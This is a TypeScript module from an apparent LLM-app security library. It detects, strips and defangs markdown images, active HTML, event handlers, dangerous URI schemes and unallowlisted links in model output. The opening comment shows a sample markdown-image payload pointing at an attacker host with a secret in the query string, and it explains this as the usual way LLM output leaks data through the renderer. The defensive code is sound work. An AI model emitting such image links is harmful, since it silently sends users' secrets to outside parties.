/**
 * Detection and removal of content that a markdown/HTML renderer would fetch
 * or execute automatically. This is the most common exfiltration channel in
 * LLM apps: the model emits `![](https://attacker/?q=<secret>)` and the
 * client's renderer leaks the secret by loading the image. No click needed.
 */

import { hostMatchesAny, safeDecode } from './urls.js';

export type ActiveContentKind =
  | 'markdown_image'
  | 'html_active_tag'
  | 'html_event_handler'
  | 'dangerous_uri'
  | 'css_url';

export interface ActiveContentMatch {
  kind: ActiveContentKind;
  match: string;
  url?: string;
}

const SCRIPT_STYLE_BLOCK = /<\s*(script|style)\b[^>]*>[\s\S]*?<\s*\/\s*\1\s*>/gi;
const ACTIVE_TAG =
  /<\s*\/?\s*(img|image|iframe|frame|frameset|script|object|embed|link|meta|form|svg|video|audio|source|style|base|input|picture|track|applet|portal)\b[^>]*>/gi;
const EVENT_HANDLER_TAG = /<\s*[a-z][a-z0-9-]*\b[^>]*\son[a-z]+\s*=[^>]*>/gi;
const INLINE_IMAGE = /!\[([^\]]*)\]\(\s*<?([^)\s>]*)>?(?:\s+(?:"[^"]*"|'[^']*'|\([^)]*\)))?\s*\)/g;
const REFERENCE_IMAGE = /!\[([^\]]*)\]\[([^\]]*)\]/g;
const DANGEROUS_ATTR = /\b(?:href|src|action|formaction|xlink:href|data|poster|background)\s*=\s*["']?\s*(?:javascript|vbscript|data|file)\s*:/gi;
const CSS_URL = /\bstyle\s*=\s*["'][^"']*\burl\s*\(/gi;

/** `[text](url "title")`, not preceded by `!`. */
const MARKDOWN_LINK = /(?<!!)\[([^\]]*)\]\(\s*<?([^)\s>]+)>?(?:\s+(?:"[^"]*"|'[^']*'|\([^)]*\)))?\s*\)/g;
/** `[ref]: url` definitions, used by reference-style links and images. */
const REFERENCE_DEF = /^[ \t]{0,3}\[([^\]]+)\]:[ \t]*<?(\S+?)>?(?:[ \t]+.*)?$/gm;
const AUTOLINK = /<((?:https?|ftp|javascript|data|vbscript|file):[^>\s]+)>/gi;
const BARE_URL = /\bhttps?:\/\/[^\s<>()"'`\]\[]+/gi;

const DANGEROUS_SCHEME = /^\s*(javascript|vbscript|data|file)\s*:/i;

export function findActiveContent(text: string): ActiveContentMatch[] {
  const found: ActiveContentMatch[] = [];
  for (const m of text.matchAll(SCRIPT_STYLE_BLOCK)) found.push({ kind: 'html_active_tag', match: m[0] });
  for (const m of text.matchAll(ACTIVE_TAG)) found.push({ kind: 'html_active_tag', match: m[0] });
  for (const m of text.matchAll(EVENT_HANDLER_TAG)) found.push({ kind: 'html_event_handler', match: m[0] });
  for (const m of text.matchAll(INLINE_IMAGE)) found.push({ kind: 'markdown_image', match: m[0], url: m[2] ?? '' });
  for (const m of text.matchAll(REFERENCE_IMAGE)) found.push({ kind: 'markdown_image', match: m[0] });
  for (const m of text.matchAll(DANGEROUS_ATTR)) found.push({ kind: 'dangerous_uri', match: m[0] });
  for (const m of text.matchAll(CSS_URL)) found.push({ kind: 'css_url', match: m[0] });
  for (const link of findLinks(text)) {
    if (DANGEROUS_SCHEME.test(safeDecode(link.url))) found.push({ kind: 'dangerous_uri', match: link.match, url: link.url });
  }
  return found;
}

export interface LinkMatch {
  kind: 'markdown' | 'reference' | 'autolink' | 'bare';
  match: string;
  url: string;
  text?: string;
}

export function findLinks(text: string): LinkMatch[] {
  const links: LinkMatch[] = [];
  const covered: Array<[number, number]> = [];
  const push = (l: LinkMatch, index: number) => {
    links.push(l);
    covered.push([index, index + l.match.length]);
  };
  for (const m of text.matchAll(MARKDOWN_LINK)) push({ kind: 'markdown', match: m[0], text: m[1] ?? '', url: m[2] ?? '' }, m.index);
  for (const m of text.matchAll(REFERENCE_DEF)) push({ kind: 'reference', match: m[0], url: m[2] ?? '' }, m.index);
  for (const m of text.matchAll(AUTOLINK)) push({ kind: 'autolink', match: m[0], url: m[1] ?? '' }, m.index);
  for (const m of text.matchAll(INLINE_IMAGE)) covered.push([m.index, m.index + m[0].length]);
  for (const m of text.matchAll(BARE_URL)) {
    const inside = covered.some(([s, e]) => m.index >= s && m.index < e);
    if (!inside) links.push({ kind: 'bare', match: m[0], url: trimTrailingPunctuation(m[0]) });
  }
  return links;
}

/** Removes everything `findActiveContent` reports. */
export function stripActiveContent(text: string): string {
  let t = text.replace(SCRIPT_STYLE_BLOCK, '[active content removed]');
  t = t.replace(ACTIVE_TAG, '[active content removed]');
  t = t.replace(EVENT_HANDLER_TAG, '[active content removed]');
  t = t.replace(INLINE_IMAGE, (_m, alt: string) => `[image removed${alt ? `: ${alt}` : ''}]`);
  t = t.replace(REFERENCE_IMAGE, (_m, alt: string) => `[image removed${alt ? `: ${alt}` : ''}]`);
  t = t.replace(MARKDOWN_LINK, (m, label: string, url: string) => (DANGEROUS_SCHEME.test(safeDecode(url)) ? `${label} [unsafe link removed]` : m));
  t = t.replace(AUTOLINK, (m, url: string) => (DANGEROUS_SCHEME.test(url) ? '[unsafe link removed]' : m));
  t = t.replace(CSS_URL, '[active content removed]');
  return t;
}

export interface DefangResult {
  text: string;
  defanged: Array<{ url: string; host: string; kind: LinkMatch['kind'] }>;
}

/**
 * Rewrites links whose host is not allowlisted:
 * - markdown links become `label (host)`, so visible text can't disguise the destination
 * - reference definitions are removed
 * - bare/auto links keep origin and path but lose query and fragment, where exfil data usually rides
 */
export function defangLinks(text: string, allowHosts: readonly string[]): DefangResult {
  const defanged: DefangResult['defanged'] = [];
  const hostOf = (raw: string): string | undefined => {
    try {
      const u = new URL(raw);
      return u.protocol === 'http:' || u.protocol === 'https:' ? u.hostname.toLowerCase() : undefined;
    } catch {
      return undefined;
    }
  };

  let t = text.replace(MARKDOWN_LINK, (m, label: string, url: string) => {
    const host = hostOf(url);
    if (!host || hostMatchesAny(host, allowHosts)) return m;
    defanged.push({ url, host, kind: 'markdown' });
    return `${label} (${host})`;
  });
  t = t.replace(REFERENCE_DEF, (m, _ref: string, url: string) => {
    const host = hostOf(url);
    if (!host || hostMatchesAny(host, allowHosts)) return m;
    defanged.push({ url, host, kind: 'reference' });
    return '';
  });
  const stripQuery = (raw: string, kind: LinkMatch['kind']): string | undefined => {
    let u: URL;
    try {
      u = new URL(raw);
    } catch {
      return undefined;
    }
    const host = u.hostname.toLowerCase();
    if (hostMatchesAny(host, allowHosts) || (!u.search && !u.hash)) return undefined;
    defanged.push({ url: raw, host, kind });
    return `${u.origin}${u.pathname}`;
  };
  t = t.replace(AUTOLINK, (m, url: string) => {
    const r = stripQuery(url, 'autolink');
    return r === undefined ? m : `<${r}>`;
  });
  t = t.replace(BARE_URL, (m) => {
    const url = trimTrailingPunctuation(m);
    const r = stripQuery(url, 'bare');
    return r === undefined ? m : r + m.slice(url.length);
  });
  return { text: t, defanged };
}

function trimTrailingPunctuation(url: string): string {
  return url.replace(/[.,;:!?]+$/, '');
}
